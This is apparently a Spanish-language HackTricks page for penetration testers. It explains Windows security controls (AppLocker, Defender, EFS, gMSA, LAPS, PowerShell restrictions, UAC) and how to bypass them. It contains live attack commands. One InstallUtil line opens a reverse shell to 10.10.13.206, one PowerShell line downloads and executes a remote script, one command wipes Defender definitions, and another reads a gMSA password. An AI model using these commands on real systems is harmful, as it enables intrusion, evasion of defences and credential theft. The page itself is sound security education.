# Controles de seguridad de Windows

{{#include ../banners/hacktricks-training.md}}

## Política de AppLocker

Una whitelist de aplicaciones es una lista de aplicaciones de software o ejecutables aprobados que pueden estar presentes y ejecutarse en un sistema. El objetivo es proteger el entorno frente a malware dañino y software no aprobado que no se ajuste a las necesidades empresariales específicas de una organización.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) es la **solución de whitelist de aplicaciones** de Microsoft y proporciona a los administradores de sistemas control sobre **qué aplicaciones y archivos pueden ejecutar los usuarios**. Proporciona un **control granular** sobre ejecutables, scripts, archivos de Windows installer, DLLs, aplicaciones empaquetadas e instaladores de aplicaciones empaquetados.\
Es común que las organizaciones **bloqueen cmd.exe y PowerShell.exe** y el acceso de escritura a determinados directorios, **pero todo esto puede ser bypassed**.

### Comprobar

Comprobar qué archivos/extensiones están en la blacklist/whitelist:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Esta ruta del registro contiene las configuraciones y políticas aplicadas por AppLocker, lo que permite revisar el conjunto actual de reglas aplicadas en el sistema:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Writable folders** útiles para realizar **bypass** de la política de AppLocker: Si AppLocker permite ejecutar cualquier cosa dentro de `C:\Windows\System32` o `C:\Windows`, existen **writable folders** que puedes usar para realizar **bypass** de esta política.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Los binarios de [**"LOLBAS"**](https://lolbas-project.github.io/) comúnmente **confiables** también pueden ser útiles para evadir AppLocker.
- Las reglas **mal escritas también podrían evadirse**.
- Por ejemplo, con **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, puedes crear una **carpeta llamada `allowed`** en cualquier ubicación y se permitirá.
- Las organizaciones también suelen centrarse en **bloquear el ejecutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, pero olvidan las **otras ubicaciones de los ejecutables de** [**PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), como `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`.
- La aplicación de restricciones sobre **DLL** casi nunca está habilitada debido a la carga adicional que puede generar en un sistema y a la cantidad de pruebas necesarias para garantizar que nada deje de funcionar. Por lo tanto, usar **DLL** como backdoors ayudará a evadir AppLocker.
- Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar** código de **Powershell** en cualquier proceso y evadir AppLocker. Para obtener más información, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Almacenamiento de credenciales

### Security Accounts Manager (SAM)

Las credenciales locales están presentes en este archivo; las contraseñas están hasheadas.

### Local Security Authority (LSA) - LSASS

Las **credenciales** (hasheadas) se **guardan** en la **memoria** de este subsistema por motivos de Single Sign-On.\
**LSA** administra la **política de seguridad** local (política de contraseñas, permisos de los usuarios...), la **autenticación**, los **tokens de acceso**...\
LSA será el componente que **comprobará** las credenciales proporcionadas dentro del archivo **SAM** (para un inicio de sesión local) y **se comunicará** con el **controlador de dominio** para autenticar a un usuario del dominio.

Las **credenciales** se **guardan** dentro del **proceso LSASS**: tickets de Kerberos, hashes NT y LM y contraseñas fácilmente descifrables.

### Secretos de LSA

LSA podría guardar algunas credenciales en el disco:

- Contraseña de la cuenta del equipo de Active Directory (controlador de dominio inaccesible).
- Contraseñas de las cuentas de los servicios de Windows.
- Contraseñas de las tareas programadas.
- Más elementos (contraseña de aplicaciones de IIS...).

### NTDS.dit

Es la base de datos de Active Directory. Solo está presente en los controladores de dominio.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) es un Antivirus disponible en Windows 10 y Windows 11, así como en versiones de Windows Server. **Bloquea** herramientas comunes de pentesting como **`WinPEAS`**. Sin embargo, existen formas de **evadir estas protecciones**.

### Comprobación

Para comprobar el **estado** de **Defender**, puedes ejecutar el cmdlet de PS **`Get-MpComputerStatus`** (comprueba el valor de **`RealTimeProtectionEnabled`** para saber si está activo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Para enumerarlo, también puedes ejecutar:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Sistema de archivos cifrado (EFS)

EFS protege los archivos mediante cifrado, utilizando una **clave simétrica** conocida como **File Encryption Key (FEK)**. Esta clave se cifra con la **clave pública** del usuario y se almacena dentro del **alternative data stream** $EFS del archivo cifrado. Cuando es necesario descifrarlo, la **clave privada** correspondiente al certificado digital del usuario se utiliza para descifrar la FEK del flujo $EFS. Se pueden encontrar más detalles [here](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Escenarios de descifrado sin intervención del usuario**:

- Cuando los archivos o carpetas se mueven a un sistema de archivos que no sea EFS, como [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), se descifran automáticamente.
- Los archivos cifrados enviados por la red mediante el protocolo SMB/CIFS se descifran antes de la transmisión.

Este método de cifrado permite un **acceso transparente** a los archivos cifrados para el propietario. Sin embargo, cambiar simplemente la contraseña del propietario e iniciar sesión no permitirá descifrarlos.

**Conclusiones principales**:

- EFS utiliza una FEK simétrica, cifrada con la clave pública del usuario.
- El descifrado emplea la clave privada del usuario para acceder a la FEK.
- El descifrado automático ocurre bajo condiciones específicas, como copiar archivos a FAT32 o transmitirlos por la red.
- El propietario puede acceder a los archivos cifrados sin pasos adicionales.

### Comprobar la información de EFS

Comprueba si un **usuario** ha **utilizado** este **servicio** verificando si existe esta ruta:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Comprueba **quién** tiene **acceso** al archivo usando cipher /c \<file>\
También puedes usar `cipher /e` y `cipher /d` dentro de una carpeta para **cifrar** y **descifrar** todos los archivos

### Descifrar archivos EFS

#### Siendo Authority System

Este método requiere que el **usuario víctima** esté **ejecutando** un **proceso** dentro del host. Si es así, mediante una sesión de `meterpreter` puedes suplantar el token del proceso del usuario (`impersonate_token` de `incognito`). También podrías simplemente hacer `migrate` al proceso del usuario.

#### Conociendo la contraseña del usuario

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft desarrolló **Group Managed Service Accounts (gMSA)** para simplificar la gestión de las cuentas de servicio en las infraestructuras de TI. A diferencia de las cuentas de servicio tradicionales, que suelen tener habilitada la configuración "**Password never expire**", las gMSA ofrecen una solución más segura y fácil de gestionar:

- **Gestión automática de contraseñas**: las gMSA utilizan una contraseña compleja de 240 caracteres que cambia automáticamente según la directiva del dominio o del equipo. Este proceso lo gestiona el Key Distribution Service (KDC) de Microsoft, eliminando la necesidad de actualizar manualmente las contraseñas.
- **Seguridad mejorada**: estas cuentas son inmunes a los bloqueos y no se pueden utilizar para inicios de sesión interactivos, lo que mejora su seguridad.
- **Compatibilidad con múltiples hosts**: las gMSA se pueden compartir entre varios hosts, lo que las hace ideales para servicios que se ejecutan en varios servidores.
- **Compatibilidad con Scheduled Tasks**: a diferencia de las managed service accounts, las gMSA permiten ejecutar tareas programadas.
- **Gestión simplificada de SPN**: el sistema actualiza automáticamente el Service Principal Name (SPN) cuando se producen cambios en los detalles sAMaccount o en el nombre DNS del equipo, simplificando la gestión de SPN.

Las contraseñas de las gMSA se almacenan en la propiedad LDAP _**msDS-ManagedPassword**_ y los Domain Controllers (DCs) las restablecen automáticamente cada 30 días. Esta contraseña, un blob de datos cifrado conocido como [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), solo puede ser recuperada por administradores autorizados y por los servidores en los que están instaladas las gMSA, garantizando un entorno seguro. Para acceder a esta información se requiere una conexión segura, como LDAPS, o la conexión debe estar autenticada con 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Puedes leer esta contraseña con [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Encuentra más información en esta publicación**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Además, consulta esta [página web](https://cube0x0.github.io/Relaying-for-gMSA/) sobre cómo realizar un **NTLM relay attack** para **leer** la **contraseña** de **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

La **Local Administrator Password Solution (LAPS)**, disponible para su descarga desde [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), permite gestionar las contraseñas del Administrator local. Estas contraseñas, que son **aleatorias**, únicas y se **cambian periódicamente**, se almacenan de forma centralizada en Active Directory. El acceso a estas contraseñas está restringido mediante ACLs a usuarios autorizados. Cuando se conceden permisos suficientes, se proporciona la capacidad de leer las contraseñas de los administradores locales.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **bloquea muchas de las funcionalidades** necesarias para utilizar PowerShell de forma eficaz, como el bloqueo de objetos COM, permitir únicamente tipos .NET aprobados, workflows basados en XAML, clases de PowerShell y mucho más.

### **Comprobar**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
En las versiones actuales de Windows, ese Bypass no funcionará, pero puedes usar [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Para compilarlo, puede que necesites** **ir a** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> añadir `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` y **cambiar el proyecto a .Net4.5**.

#### Bypass directo:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar código de Powershell** en cualquier proceso y hacer bypass del modo restringido. Para más información, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Política de ejecución de PS

De forma predeterminada, está configurada como **restringida.** Principales formas de hacer bypass de esta política:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Puedes encontrar más información [aquí](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

Es la API que se puede utilizar para autenticar usuarios.

SSPI se encargará de encontrar el protocolo adecuado para dos máquinas que desean comunicarse. El método preferido para esto es Kerberos. Después, SSPI negociará qué protocolo de autenticación se utilizará. Estos protocolos de autenticación se denominan Security Support Provider (SSP), se encuentran dentro de cada máquina Windows en forma de una DLL y ambas máquinas deben admitir el mismo para poder comunicarse.

### Principales SSP

- **Kerberos**: El preferido
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** y **NTLMv2**: Por razones de compatibilidad
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Servidores web y LDAP, contraseña en forma de un hash MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL y TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Se utiliza para negociar el protocolo que se usará (Kerberos o NTLM, siendo Kerberos el predeterminado)
- %windir%\Windows\System32\lsasrv.dll

#### La negociación podría ofrecer varios métodos o solo uno.

## UAC - Control de cuentas de usuario

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una funcionalidad que habilita un **aviso de consentimiento para actividades elevadas**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Referencias

- [1] [Bypassing Applocker and Powershell contstrained language mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [2] [cómo descifrar archivos EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying for gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 formas de omitir la directiva de ejecución de PowerShell](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

{{#include ../banners/hacktricks-training.md}}
